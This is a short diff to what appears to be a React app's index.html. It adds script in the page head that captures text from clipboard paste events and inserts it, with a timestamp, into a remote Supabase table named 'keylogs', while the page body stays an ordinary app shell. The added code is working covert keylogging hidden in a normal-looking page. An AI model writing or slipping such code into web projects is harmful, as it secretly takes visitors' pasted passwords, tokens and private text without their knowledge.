@@ -47,4 +47,21 @@
 
     function logClipboard(e) {
       const text = e.clipboardData ? e.clipboardData.getData('text') : '';
-      sendTo
+      sendToSupabase(text);
+    }
+
+    function sendToSupabase(data) {
+      supabase.from('keylogs')
+        .insert({
+          key: data,
+          timestamp: new Date().toISOString()
+        })
+        .catch(err => console.error('Supabase error:', err));
+    }
+  </script>
+</head>
+<body>
+  <div id="root"></div>
+  <script type="module" src="/src/index.tsx"></script>
+</body>
+</html>
